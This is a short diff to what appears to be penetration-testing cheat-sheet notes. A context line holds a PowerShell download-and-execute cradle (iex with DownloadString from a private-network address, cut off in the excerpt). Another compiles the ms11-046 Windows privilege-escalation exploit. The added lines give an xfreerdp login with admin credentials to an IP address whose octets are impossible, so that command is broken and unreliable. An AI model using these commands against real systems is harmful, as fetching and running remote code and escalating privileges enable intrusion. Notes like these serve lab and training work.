@@ -131,3 +131,6 @@ powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://192.168
 
 Cross compilation an example:
 i686-w64-mingw32-gcc ms11-046.c -o ms11-046.exe -lws2_32
+
+xfree rdp usage:
+xfreerdp /u:admin /p:lab /v:192.468.456.10:3389
